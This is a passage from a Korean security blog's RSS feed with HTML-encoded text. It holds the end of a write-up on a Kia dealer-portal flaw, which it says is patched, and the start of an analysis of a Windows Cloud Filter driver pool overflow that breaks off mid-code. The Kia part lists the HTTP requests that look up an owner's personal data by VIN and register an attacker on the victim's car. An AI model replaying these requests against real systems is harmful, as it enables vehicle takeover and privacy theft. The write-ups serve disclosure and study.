&#xAE30;&#xC544; &#xCEE4;&#xB125;&#xD2B8; &#xAD6C;&#xB3C5;&#xC774; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xCC28;&#xB7C9;&#xC5D0;&#xC11C;&#xB3C4; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; &#xC801;&#xC6A9;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xACF5;&#xACA9;&#xC790;&#xB294; &#xC774;&#xB984;, &#xC804;&#xD654;&#xBC88;&#xD638;, &#xC774;&#xBA54;&#xC77C;, &#xC9D1; &#xC8FC;&#xC18C;&#xC640; &#xAC19;&#xC740; &#xAC1C;&#xC778; &#xC815;&#xBCF4;&#xB97C; &#xD68D;&#xB4DD;&#xD558;&#xC5EC;, &#xD53C;&#xD574;&#xC790; &#xBAB0;&#xB798; &#xCC28;&#xB7C9;&#xC758; &#xB450; &#xBC88;&#xC9F8; &#xC0AC;&#xC6A9;&#xC790;&#xB85C; &#xB4F1;&#xB85D;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xAE30;&#xC544;&#xC758; &#xB0B4;&#xBD80; &#xD328;&#xCE58;&#xB97C; &#xAC70;&#xCCD0; 2024&#xB144; 9&#xC6D4; 26&#xC77C;&#xC5D0; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCD08;&#xAE30; &#xD0C0;&#xAC9F;&#xC740; &#xC778;&#xD130;&#xB137;&#xC744; &#xD1B5;&#xD574; &#xCC28;&#xB7C9; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; owners.kia.com &#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xC640; Kia Connect iOS &#xC571;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xB294; reverse proxy&#xB97C; &#xD1B5;&#xD574; &#xC0AC;&#xC6A9;&#xC790; &#xBA85;&#xB839;&#xC744; &#xAE30;&#xC544; Backend &#xC11C;&#xBE44;&#xC2A4;&#xB85C; &#xC804;&#xB2EC;&#xD558;&#xACE0;, &#xBAA8;&#xBC14;&#xC77C; &#xC571;&#xC740; API&#xC5D0; &#xC9C1;&#xC811; &#xC811;&#xADFC;&#xD558;&#xB294; &#xAD6C;&#xC870;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xC5D0;&#xC11C; API &#xC694;&#xCCAD;&#xC774; &#xD504;&#xB85D;&#xC2DC; &#xC11C;&#xBC84;&#xB97C; &#xAC70;&#xCCD0; Backend&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xB294; &#xBC29;&#xC2DD;&#xC744; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/apps/services/owners/apigwServlet.html</span> HTTP/2<span class="hljs-attribute">Host</span>: owners.kia.com<span class="hljs-attribute">Httpmethod</span>: GET<span class="hljs-attribute">Apiurl</span>: /door/unlock<span class="hljs-attribute">Servicetype</span>: postLoginCustomer<span class="hljs-attribute">Cookie</span>: JSESSIONID=SESSION_TOKEN;</code></pre><p>&#xC0AC;&#xC6A9;&#xC790;&#xAC00; owners.kia.com &#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xC5D0;&#xC11C; &#xCC28;&#xB7C9; &#xC7A0;&#xAE08; &#xD574;&#xC81C;&#xB97C; &#xC2DC;&#xB3C4;&#xD558;&#xBA74;, &#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xC5D0;&#xC11C; &#xC704;&#xC640; &#xAC19;&#xC740; HTTP &#xC694;&#xCCAD;&#xC774; &#xC804;&#xC1A1;&#xB429;&#xB2C8;&#xB2E4;.<br>&#xC774; &#xC694;&#xCCAD;&#xC5D0;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC138;&#xC158; &#xC815;&#xBCF4;&#xB97C; &#xB2F4;&#xACE0; &#xC788;&#xC73C;&#xBA70;, &#xCFE0;&#xD0A4;&#xC5D0; <code>JSESSIONID</code> &#xAC00; &#xD3EC;&#xD568;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /apigw/v<span class="hljs-number">1</span>/rems/door/unlock HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: api.owners.kia.com<span class="hljs-attribute">Sid</span>: <span class="hljs-number">454817</span>d<span class="hljs-number">4</span>-b<span class="hljs-number">228</span>-<span class="hljs-number">4103</span>-a<span class="hljs-number">26</span>f-<span class="hljs-number">884</span>e<span class="hljs-number">362</span>e<span class="hljs-number">8</span>dee<span class="hljs-attribute">Vinkey</span>: <span class="hljs-number">3</span>ecc<span class="hljs-number">1</span>a<span class="hljs-number">19</span>-aefd-<span class="hljs-number">4188</span>-a<span class="hljs-number">7</span>fe-<span class="hljs-number">1723</span>e<span class="hljs-number">1663</span>d<span class="hljs-number">6</span>e</code></pre><p>&#xC774;&#xD6C4;, &#xD504;&#xB85D;&#xC2DC; &#xC11C;&#xBC84;&#xB294; &#xBC31;&#xC5D4;&#xB4DC; &#xC11C;&#xBC84;&#xB85C; <code>Sid</code> &#xD1A0;&#xD070;&#xACFC; <code>Vinkey</code> &#xAC12;&#xC744; &#xB2F4;&#xACE0; &#xC788;&#xB294; HTTP &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;.</p><p><code>Sid</code>&#xC740; &#xC55E;&#xC11C; &#xC804;&#xB2EC;&#xBC1B;&#xC740; <code>JSESSIONID</code>&#xB97C; &#xD1B5;&#xD574; &#xC0AC;&#xC6A9;&#xC790; &#xC138;&#xC158;&#xC744; &#xC778;&#xC99D; &#xD6C4; &#xC0DD;&#xC131;&#xD55C; &#xD1A0;&#xD070; &#xAC12;&#xC774;&#xBA70;,</p><p><code>Vinkey</code>&#xAC12;&#xC740; &#xCC28;&#xB7C9;&#xC758; VIN(Vehicle Identification Number, &#xCC28;&#xB7C9; &#xC2DD;&#xBCC4; &#xBC88;&#xD638;)&#xC640; &#xC5F0;&#xACB0;&#xB41C; &#xACE0;&#xC720;&#xD55C; UUID&#xC785;&#xB2C8;&#xB2E4;.</p><p>2023&#xB144;&#xC5D0; &#xBC1C;&#xACAC;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xACFC; &#xB3D9;&#xC77C;&#xD55C; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC791;&#xB3D9;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xC774;&#xB97C; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; &#xC0C8;&#xB85C;&#xC6B4; &#xCC28;&#xB7C9;&#xC744; &#xAD6C;&#xB9E4;&#xD588;&#xC744; &#xB54C; &#xACE0;&#xAC1D; &#xC815;&#xBCF4;&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xCC98;&#xB9AC;&#xB418;&#xB294;&#xC9C0;&#xB97C; &#xD30C;&#xC545;&#xD558;&#xACE0;&#xC790; &#xAE30;&#xC544; &#xB51C;&#xB7EC; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xD0C0;&#xAC9F;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>kiaconnect.kdealer.com<span class="hljs-regexp">/content/</span>kDealer<span class="hljs-regexp">/en/</span>kiauser.html?token=dealer_generated_access_token&amp;vin=example_vin&amp;scenarioType=<span class="hljs-number">3</span></code></pre><p>&#xC0C8;&#xB85C; &#xAD6C;&#xB9E4;&#xD55C; &#xCC28;&#xB7C9;&#xC744; &#xB4F1;&#xB85D;&#xD560; &#xB54C;, &#xAE30;&#xC544; &#xB51C;&#xB7EC;&#xB294; &#xACE0;&#xAC1D;&#xC5D0;&#xAC8C; &#xC774;&#xBA54;&#xC77C;&#xB85C; &#xB4F1;&#xB85D; &#xB9C1;&#xD06C;&#xB97C; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;. </p><p>&#xC704; &#xC608;&#xC2DC; &#xB9C1;&#xD06C;&#xB97C; &#xD655;&#xC778;&#xD558;&#xBA74;, <code>token</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB294; &#xB51C;&#xB7EC;&#xAC00; &#xC0DD;&#xC131;&#xD55C; &#xC77C;&#xD68C;&#xC131; &#xC561;&#xC138;&#xC2A4; &#xD1A0;&#xD070;&#xC774;&#xBA70;, <code>vin</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB294; &#xCC28;&#xB7C9; &#xACE0;&#xC720;&#xBC88;&#xD638;(VIN)&#xB97C; &#xB098;&#xD0C0;&#xB0C5;&#xB2C8;&#xB2E4;. <code>vin</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xC9C0;&#xC815;&#xB41C; &#xCC28;&#xB7C9;&#xC744; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/apps/services/kdealer/apigwServlet.html</span> HTTP/1.1<span class="hljs-attribute">Host</span>: kiaconnect.kdealer.com{  &quot;token&quot;: &quot;985a49f0-1fe5-4d36-860e-d9b93272072b&quot;,  &quot;vin&quot;: &quot;5XYP3DHC9NG310533&quot;,  &quot;scenarioType&quot;: 3,  &quot;loginPref&quot;: null}</code></pre><p>&#xC704; &#xC694;&#xCCAD;&#xC744; &#xD1B5;&#xD574; <code>token</code>&#xACFC; <code>vin</code>&#xC758; &#xC720;&#xD6A8;&#xC131;&#xC744; &#xD655;&#xC778;&#xD558;&#xBA70;, &#xAE30;&#xC544; &#xB51C;&#xB7EC;&#xC758; &#xC778;&#xD504;&#xB77C;&#xAC00; &#xACE0;&#xAC1D; &#xC815;&#xBCF4;&#xC640; &#xC5F0;&#xACB0;&#xB418;&#xC5B4; &#xC788;&#xC74C;&#xC744; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs kotlin">dealerVehicleLookUp() {    <span class="hljs-keyword">this</span>.displayLoader = !<span class="hljs-number">0</span>, <span class="hljs-keyword">this</span>.vinToEnroll = <span class="hljs-string">&quot;eDelivery&quot;</span> != <span class="hljs-keyword">this</span>.entryPoint ? <span class="hljs-keyword">this</span>.vinToEnroll.replace(/\s/g, <span class="hljs-string">&quot;&quot;</span>) : <span class="hljs-keyword">this</span>.userDetails.vin, <span class="hljs-string">&quot;17&quot;</span> == <span class="hljs-keyword">this</span>.vinToEnroll.length &amp;&amp; <span class="hljs-keyword">this</span>.landingPageService.postOffice({        vin: <span class="hljs-keyword">this</span>.vinToEnroll    }, <span class="hljs-string">&quot;/dec/dlr/dvl&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-string">&quot;postLoginCustomer&quot;</span>).subscribe(i =&gt; {        i &amp;&amp; (i.hasOwnProperty(<span class="hljs-string">&quot;body&quot;</span>) &amp;&amp; <span class="hljs-string">&quot;0&quot;</span> == i.body.status.statusCode ? <span class="hljs-keyword">this</span>.processDvlData(i.body) : <span class="hljs-string">&quot;1003&quot;</span> == i.body.status.errorCode &amp;&amp; <span class="hljs-string">&quot;kia-dealer&quot;</span> == <span class="hljs-keyword">this</span>.entryPoint ? <span class="hljs-keyword">this</span>.reRouteSessionExpire() : (<span class="hljs-keyword">this</span>.displayLoader = !<span class="hljs-number">1</span>, <span class="hljs-keyword">this</span>.alertMessage = i.body.status.errorMessage, document.getElementById(<span class="hljs-string">&quot;triggerGeneralAlertModal&quot;</span>).click()))    })}</code></pre><p>&#xB51C;&#xB7EC; &#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xC758; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xCF54;&#xB4DC;&#xB97C; &#xBD84;&#xC11D;&#xD55C; &#xACB0;&#xACFC;, &#xC9C1;&#xC6D0; &#xC804;&#xC6A9; API &#xD638;&#xCD9C;&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; API&#xB294; &#xCC28;&#xB7C9; &#xC870;&#xD68C;, &#xACC4;&#xC815; &#xC870;&#xD68C;, &#xCC28;&#xB7C9; &#xB4F1;&#xB85D; &#xBC0F; &#xD574;&#xC9C0; &#xB4F1; &#xC9C1;&#xC6D0;&#xB9CC; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xD30C;&#xC545;&#xB418;&#xC5B4; &#xB51C;&#xB7EC; &#xC804;&#xC6A9; API &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xB97C; &#xD0C0;&#xAC9F;&#xC73C;&#xB85C; &#xACF5;&#xACA9;&#xC744; &#xC2DC;&#xB3C4;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/apps/services/kdealer/apigwServlet.html</span> HTTP/1.1<span class="hljs-attribute">Host</span>: kiaconnect.kdealer.com<span class="hljs-attribute">Httpmethod</span>: POST<span class="hljs-attribute">Apiurl</span>: /prof/registerUser{  &quot;userCredential&quot;: {    &quot;firstName&quot;: &quot;Sam&quot;,    &quot;lastName&quot;: &quot;Curry&quot;,    &quot;userId&quot;: &quot;normal.user@gmail.com&quot;,    &quot;password&quot;: &quot;FakePass123!&quot;,    &quot;acceptedTerms&quot;: 1  }}</code></pre><p>&#xC704; &#xC694;&#xCCAD;&#xC744; &#xD1B5;&#xD574; &#xB51C;&#xB7EC; &#xC0AC;&#xC774;&#xD2B8;&#xC5D0; &#xC0AC;&#xC6A9;&#xC790; &#xACC4;&#xC815;&#xC744; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xB4F1;&#xB85D;&#xD55C; &#xD6C4;, &#xB85C;&#xADF8;&#xC778;&#xD558;&#xC5EC; &#xC138;&#xC158; &#xCFE0;&#xD0A4;&#xB97C; &#xD68D;&#xB4DD;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs apache"><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> <span class="hljs-number">200</span> OK<span class="hljs-attribute">Sid</span>: <span class="hljs-number">123</span>e<span class="hljs-number">4567</span>-e<span class="hljs-number">89</span>b-<span class="hljs-number">12</span>d<span class="hljs-number">3</span>-a<span class="hljs-number">456</span>-<span class="hljs-number">426614174000</span></code></pre><p>&#xC138;&#xC158; &#xCFE0;&#xD0A4;&#xB97C; &#xD1B5;&#xD574; &#xAE30;&#xC544; &#xB51C;&#xB7EC; API&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xACE0;, &#xCC28;&#xB7C9; &#xC18C;&#xC720;&#xC790;&#xC758; &#xC774;&#xB984;, &#xC774;&#xBA54;&#xC77C;, &#xC804;&#xD654;&#xBC88;&#xD638; &#xB4F1;&#xC758; &#xAC1C;&#xC778; &#xC815;&#xBCF4;&#xB97C; &#xC870;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/10/01/h4mG/kia/image.png" alt></p><p>&#xC774;&#xD6C4; &#xCC28;&#xB7C9;&#xC744; &#xC6D0;&#xACA9;&#xC73C;&#xB85C; &#xC81C;&#xC5B4;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC704;&#xC640; &#xAC19;&#xC774; &#xACF5;&#xACA9; &#xC808;&#xCC28;&#xB97C; &#xAD6C;&#xC131;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>4&#xBC88;&#xC758; HTTP &#xC694;&#xCCAD;&#xC744; &#xD1B5;&#xD574; &#xD53C;&#xD574;&#xC790; &#xCC28;&#xB7C9;&#xC758; &#xAD8C;&#xD55C;&#xC744; &#xC218;&#xC815;&#xD558;&#xACE0;, &#xACF5;&#xACA9;&#xC790;&#xB97C; &#xC8FC;&#xC694; &#xC0AC;&#xC6A9;&#xC790;&#xB85C; &#xB4F1;&#xB85D;&#xD558;&#xB294; &#xACF5;&#xACA9;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="1-&#xB51C;&#xB7EC;-&#xD1A0;&#xD070;-&#xC0DD;&#xC131;-&#xBC0F;-&#xC138;&#xC158;-&#xD68D;&#xB4DD;"><a href="#1-&#xB51C;&#xB7EC;-&#xD1A0;&#xD070;-&#xC0DD;&#xC131;-&#xBC0F;-&#xC138;&#xC158;-&#xD68D;&#xB4DD;" class="headerlink" title="1.&#xB51C;&#xB7EC; &#xD1A0;&#xD070; &#xC0DD;&#xC131; &#xBC0F; &#xC138;&#xC158; &#xD68D;&#xB4DD;"></a>1.&#xB51C;&#xB7EC; &#xD1A0;&#xD070; &#xC0DD;&#xC131; &#xBC0F; &#xC138;&#xC158; &#xD68D;&#xB4DD;</h3><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/apps/services/kdealer/apigwServlet.html</span> HTTP/1.1<span class="hljs-attribute">Host</span>: kiaconnect.kdealer.com<span class="hljs-attribute">Httpmethod</span>: POST<span class="hljs-attribute">Apiurl</span>: /prof/authUser{  &quot;userCredential&quot;: {    &quot;userId&quot;: &quot;normal.kia.user@gmail.com&quot;,    &quot;password&quot;: &quot;Fakepass123!&quot;  }}</code></pre><h3 id="2-&#xD53C;&#xD574;&#xC790;&#xC758;-&#xC774;&#xBA54;&#xC77C;-&#xBC0F;-&#xC804;&#xD654;&#xBC88;&#xD638;-&#xC870;&#xD68C;"><a href="#2-&#xD53C;&#xD574;&#xC790;&#xC758;-&#xC774;&#xBA54;&#xC77C;-&#xBC0F;-&#xC804;&#xD654;&#xBC88;&#xD638;-&#xC870;&#xD68C;" class="headerlink" title="2. &#xD53C;&#xD574;&#xC790;&#xC758; &#xC774;&#xBA54;&#xC77C; &#xBC0F; &#xC804;&#xD654;&#xBC88;&#xD638; &#xC870;&#xD68C;"></a>2. &#xD53C;&#xD574;&#xC790;&#xC758; &#xC774;&#xBA54;&#xC77C; &#xBC0F; &#xC804;&#xD654;&#xBC88;&#xD638; &#xC870;&#xD68C;</h3><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/apps/services/kdealer/apigwServlet.html</span> HTTP/1.1<span class="hljs-attribute">Host</span>: kiaconnect.kdealer.com<span class="hljs-attribute">Appid</span>: 123e4567-e89b-12d3-a456-426614174000<span class="hljs-attribute">Apiurl</span>: /dec/dlr/dvl{    &quot;vin&quot;: &quot;1HGBH41JXMN109186&quot;}</code></pre><h3 id="3-&#xD53C;&#xD574;&#xC790;&#xC758;-&#xC811;&#xADFC;-&#xAD8C;&#xD55C;-&#xC218;&#xC815;"><a href="#3-&#xD53C;&#xD574;&#xC790;&#xC758;-&#xC811;&#xADFC;-&#xAD8C;&#xD55C;-&#xC218;&#xC815;" class="headerlink" title="3. &#xD53C;&#xD574;&#xC790;&#xC758; &#xC811;&#xADFC; &#xAD8C;&#xD55C; &#xC218;&#xC815;"></a>3. &#xD53C;&#xD574;&#xC790;&#xC758; &#xC811;&#xADFC; &#xAD8C;&#xD55C; &#xC218;&#xC815;</h3><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/apps/services/kdealer/apigwServlet.html</span> HTTP/1.1<span class="hljs-attribute">Host</span>: kiaconnect.kdealer.com<span class="hljs-attribute">Httpmethod</span>: POST<span class="hljs-attribute">Apiurl</span>: /dec/dlr/rvp<span class="hljs-attribute">Appid</span>: 123e4567-e89b-12d3-a456-426614174000{  &quot;vin&quot;: &quot;VIN&quot;,  &quot;loginId&quot;: &quot;victim_email_leaked@gmail.com&quot;,  &quot;dealerCode&quot;: &quot;eDelivery&quot;}</code></pre><h3 id="4-&#xACF5;&#xACA9;&#xC790;&#xB97C;-&#xD53C;&#xD574;&#xC790;-&#xCC28;&#xB7C9;&#xC5D0;-&#xCD94;&#xAC00;"><a href="#4-&#xACF5;&#xACA9;&#xC790;&#xB97C;-&#xD53C;&#xD574;&#xC790;-&#xCC28;&#xB7C9;&#xC5D0;-&#xCD94;&#xAC00;" class="headerlink" title="4. &#xACF5;&#xACA9;&#xC790;&#xB97C; &#xD53C;&#xD574;&#xC790; &#xCC28;&#xB7C9;&#xC5D0; &#xCD94;&#xAC00;"></a>4. &#xACF5;&#xACA9;&#xC790;&#xB97C; &#xD53C;&#xD574;&#xC790; &#xCC28;&#xB7C9;&#xC5D0; &#xCD94;&#xAC00;</h3><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/apps/services/kdealer/apigwServlet.html</span> HTTP/1.1<span class="hljs-attribute">Host</span>: kiaconnect.kdealer.com<span class="hljs-attribute">Httpmethod</span>: POST<span class="hljs-attribute">Apiurl</span>: /ownr/dicve<span class="hljs-attribute">Appid</span>: 123e4567-e89b-12d3-a456-426614174000{  &quot;vin&quot;: &quot;5XYRK4LFXMG016215&quot;,  &quot;loginId&quot;: &quot;attacker@gmail.com&quot;}</code></pre><p>&#xC774; &#xACFC;&#xC815;&#xC744; &#xD1B5;&#xD574; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xCC28;&#xB7C9;&#xC758; &#xC8FC;&#xC694; &#xAE30;&#xB2A5;&#xC744; &#xC6D0;&#xACA9;&#xC73C;&#xB85C; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xC5C8;&#xC73C;&#xBA70;, &#xD53C;&#xD574;&#xC790;&#xB294; &#xC774;&#xB97C; &#xC804;&#xD600; &#xC778;&#xC9C0;&#xD558;&#xC9C0; &#xBABB;&#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h1><iframe width="560" height="315" src="https://www.youtube.com/embed/jMHFCpQdZyg" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><p>2022&#xB144;&#xD615; &#xAE30;&#xC544; EV6 &#xCC28;&#xB7C9;&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xC6D0;&#xACA9; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xC601;&#xC0C1;&#xC785;&#xB2C8;&#xB2E4;. </p><p>&#xACF5;&#xACA9;&#xC790;&#xAC00; &#xAE30;&#xC544; &#xCC28;&#xB7C9;&#xC758; &#xBC88;&#xD638;&#xD310;&#xC744; &#xC785;&#xB825;&#xD558;&#xACE0;, &#xC18C;&#xC720;&#xC8FC; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xB97C; &#xAC00;&#xC838;&#xC628; &#xB4A4; &#xCC28;&#xB7C9;&#xC758; &#xC6D0;&#xACA9; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://www.boannews.com/media/view.asp?idx=133232">https://www.boannews.com/media/view.asp?idx=133232</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/KIA/">KIA</category>
      
      <category domain="https://hackyboiz.github.io/tags/h4mG/">h4mG</category>
      
      
      <comments>https://hackyboiz.github.io/2024/10/01/h4mG/kia/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-21310: Microsoft Cloud Filter Driver의 Numeric Truncation으로 인한 Pool Overflow 취약점</title>
      <link>https://hackyboiz.github.io/2024/09/28/j0ker/2024-09-28/</link>
      <guid>https://hackyboiz.github.io/2024/09/28/j0ker/2024-09-28/</guid>
      <pubDate>Sat, 28 Sep 2024 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://gabrieldurdiak.github.io/clfd/&quot;&gt;Analysis of</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://gabrieldurdiak.github.io/clfd/">Analysis of CVE-2024-21310 Pool Overflow Windows Cloud Filter Driver</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21310">MSRc Security Updates</a> &#xCC38;&#xACE0;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xBA3C;&#xC800; &#xC708;&#xB3C4;&#xC6B0;&#xC5D0;&#xC11C; <a href="https://www.microfocus.com/documentation/filr/filr-4/filr-desktop/t47bx2ogpfz7.html">&#xAE34; &#xACBD;&#xB85C;&#xB97C; &#xD65C;&#xC131;&#xD654;</a>&#xD574;&#xC57C; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>NtCreateFile &#xD568;&#xC218;&#xB294; HsmiQueryFullFilePath &#xD568;&#xC218;&#xC5D0; &#xACBD;&#xB85C;&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">InformationFile = HsmiQueryFullFilePath(v22, v23, Object, <span class="hljs-number">257</span>i64, &amp;PathSize); [<span class="hljs-number">1</span>]      HsmDbgBreakOnStatus((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)InformationFile);      <span class="hljs-keyword">if</span> ( InformationFile &lt; <span class="hljs-number">0</span> )      {        <span class="hljs-keyword">if</span> ( WPP_GLOBAL_Control != (PDEVICE_OBJECT)&amp;WPP_GLOBAL_Control          &amp;&amp; (HIDWORD(WPP_GLOBAL_Control-&gt;Timer) &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span>          &amp;&amp; BYTE1(WPP_GLOBAL_Control-&gt;Timer) &gt;= <span class="hljs-number">2u</span> )        {          WPP_SF_qqd(            WPP_GLOBAL_Control-&gt;AttachedDevice,            <span class="hljs-number">183</span>i64,            &amp;WPP_78064aab483a35e2f1ef7b76ba44fd52_Traceguids,            a2,            v21,            InformationFile);        }        <span class="hljs-keyword">goto</span> LABEL_93;      }      v24 = PathSize + *(_WORD *)(a2 + <span class="hljs-number">0x40</span>); [<span class="hljs-number">2</span>]</code></pre><p>[1]&#xC5D0;&#xC11C; 8&#xBC14;&#xC774;&#xD2B8; &#xD06C;&#xAE30;&#xC778; int64 &#xD0C0;&#xC785;&#xC758; PathSize&#xC5D0; &#xAE38;&#xC774;&#xB97C; &#xC800;&#xC7A5;&#xD574; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xBC18;&#xD658;&#xB41C; PathSize&#xB294; [2]&#xC5D0;&#xC11C; &#xC5F0;&#xC0B0;&#xC744; &#xD55C;&#xBC88; &#xAC70;&#xCE58;&#xAC8C; &#xB418;&#xB294;&#xB370; &#xC774; &#xB54C; &#xB450; &#xC22B;&#xC790;&#xB97C; &#xC5F0;&#xC0B0;&#xD574; &#xACB0;&#xACFC;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xBCC0;&#xC218; v24&#xB294; 2&#xBC14;&#xC774;&#xD06C; &#xD06C;&#xAE30;&#xC758; int16 &#xD0C0;&#xC785;&#xC758; &#xBCC0;&#xC218;&#xB85C; &#xD558;&#xC704; &#xAC12;&#xB4E4;&#xB9CC; &#xC800;&#xC7A5;&#xB418;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; PathSize&#xC640;   a2 + 0x40 &#xAC12;&#xC758; &#xD569;&#xC774; 2&#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xD45C;&#xD604;&#xD560; &#xC218; &#xC788;&#xB294; &#xCD5C;&#xB300;&#xAC12;&#xC778; 0xFFFF&#xB97C; &#xB118;&#xC5B4;&#xAC04;&#xB2E4;&#xBA74; Integer Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD574; &#xC2E4;&#xC81C;&#xBCF4;&#xB2E4; &#xC791;&#xC740; &#xAC12;&#xC774; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs 